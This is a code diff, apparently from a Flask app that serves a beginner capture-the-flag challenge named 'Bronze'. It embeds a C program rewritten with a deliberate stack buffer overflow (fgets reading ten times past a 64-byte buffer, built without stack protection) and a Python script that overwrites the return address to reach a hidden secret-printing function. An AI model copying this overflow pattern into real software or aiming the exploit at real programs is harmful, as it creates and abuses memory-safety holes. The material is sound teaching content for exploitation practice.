@@ -9,80 +9,143 @@ bronze_md = """
 #include <stdio.h>
 #include <string.h>
 
-void printSecret() {
-    int encoded_secret[] = {0x134C, 0x1375, 0x135B, 0x1342, 0x1304, 0x131A, 0x1303, 0x1359, 0x1353, 0x131A, 0x1307, 0x1345, 0x1356, 0x1359, 0x1350, 0x1304, 0x134A, 0x1337};
-
-    int key = 0x1337;
-    int i = 0;
-
-    printf("CTF-KEY ");
-    while ((encoded_secret[i] ^ key) != 0) {
-        printf("%c", (char)(encoded_secret[i] ^ key));
-        i++;
-    }
-    printf("\\n");
-}
-
-int logToFile(char *logTxt)
+int logToFile()
 { 
     char tmpLog[64];
+
+    printf("Enter Text: ");
+
+    fgets(tmpLog, sizeof(tmpLog) * 10, stdin);
+
     printf("[+] logging to file\\n");
-    sprintf(tmpLog, "[+] %s", logTxt);
     FILE *logFile = fopen("log.txt", "w");
     if (logFile == NULL)
     {
         return 1;
     }
 
-    fprintf(logFile, "%s\\n", tmpLog);
+    fprintf(logFile, "%s", tmpLog);
     fclose(logFile);
+
+    fflush(stdout);
 
     return 0;
 }
 
+void printSecret() {
+    int encoded_secret[] = {0x134C, 0x1375, 0x135B, 0x1342, 0x1304, 0x131A, 0x1303, 0x1359, 0x1353, 0x131A, 0x1307, 0x1345, 0x1356, 0x1359, 0x1350, 0x1304, 0x134A, 0x1337};
+
+    int key = 0x1337;
+    int i = 0;
+
+    // The array has 18 elements. We need a buffer of size 19 (18 chars + 1 null byte).
+    char decoded_buffer[19]; 
+
+    // --- Decoding and Storing ---
+    while ((encoded_secret[i] ^ key) != 0) {
+        
+        // Decode the character using XOR and cast it to a char
+        char decoded_char = (char)(encoded_secret[i] ^ key);
+        
+        // Store the decoded character in the buffer
+        decoded_buffer[i] = decoded_char;
+        
+        i++;
+    }
+
+    decoded_buffer[i] = '\\0';
+
+    printf("%s %s", "CTF-KEY", decoded_buffer);
+
+    fflush(stdout);
+}
+
 int main(int argc, char *argv[])
 {
-    logToFile(argv[1]);
+    printf("Starting\\n");
+    logToFile();
 }
+
+
+// How to Compile:
+// gcc -m32 -no-pie -O0 -Wno-format-truncation -w -fno-stack-protector bronze.c -o bronze
 ```
 """
 
 python_md = """
 ```python
-# Bronze CTF
+# Bronze CTF - Corrected STDIN Injection
 
 import subprocess
 import os
+import struct
+import tempfile
 
-# The name of the executable file in the current directory
-EXECUTABLE_NAME = './bronze'
+# --- CTF Setup ---
+DEBUGGER_NAME = 'edb'
+TARGET_EXECUTABLE = './bronze'
 
-# The specific string parameter: 'A' repeated 16 times
-PARAMETER_STRING = 'A' * 16
+# Your specific EIP address
+# Note: This payload is still structured for a stack buffer, not a command line arg.
+new_eip = struct.pack("<I", 0x08049280)
 
-def run_program_with_parameter():
+# The specific string parameter (your payload)
+# Total padding = 76 bytes (adjust this padding to match the STDIN buffer size)
+PAYLOAD_STRING = b'A' * 64 + b'B' * 16 + new_eip
 
-    command = [EXECUTABLE_NAME, PARAMETER_STRING]
-    
-    result = subprocess.run(
-        command,
-        capture_output=True,
-        text=True,
-        check=False 
-    )
+def run_program_with_stdin_injection():
+    temp_file_path = None
+    try:
+        # 1. Create and write the raw payload to a temporary file
+        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
+            temp_file_path = tmp_file.name
+            # Write the raw bytes directly to the file
+            tmp_file.write(PAYLOAD_STRING)
 
-    # Display the results
-    if result.stdout:
-        print(result.stdout)
+        print(f"[*] Raw payload written to temporary file: {temp_file_path}")
 
-    if result.returncode < 0:
-        if result.returncode == -11:
-            print("SEGMENT FAULT!")
-            exit(-11)
-        print(f"Error!")
+        # 2. Construct the command to use EDB's --stdin flag
+        # EDB requires --stdin <filename> to precede --run
+        command = [
+            DEBUGGER_NAME,
+            '--stdin',                   # Flag 1: Redirect STDIN
+            temp_file_path,              # Argument 1: The file to use for STDIN
+            '--run',                     # Flag 2: Immediate execution
+            TARGET_EXECUTABLE            # Argument 2: The program EDB should run
+        ]
+        
+        # 3. Execute the command
+        # Key change: Removing text=True or ensuring it is handled properly, 
+        # as edb uses an external terminal.
+        result = subprocess.run(
+            command,
+            capture_output=True,
+            # Removed text=True to handle potential encoding issues with terminal output
+            check=False
+        )
+
+        # 4. Process results (output may be limited since edb opens a terminal)
+        print("\n--- Execution Finished ---")
+        if result.returncode != 0:
+            print(f"Program exited with code {result.returncode}")
+            # Common Linux exit code for SIGSEGV is 139
+            if result.returncode == 139: 
+                print("[+] SEGMENTATION FAULT (Exploit Success Expected)!")
+            elif result.returncode == 1:
+                print("[-] Error: edb might have failed to launch the terminal (xterm issue).")
+        else:
+            print("[?] Program exited cleanly (No crash observed).")
+
+
+    finally:
+        # 5. Clean up the temporary file
+        if temp_file_path and os.path.exists(temp_file_path):
+            os.remove(temp_file_path)
+            print(f"[*] Cleaned up temporary file: {temp_file_path}")
 
 if __name__ == "__main__":
-    run_program_with_parameter()
+    run_program_with_stdin_injection()
+```
 """
 
 main = Blueprint("main", __name__)
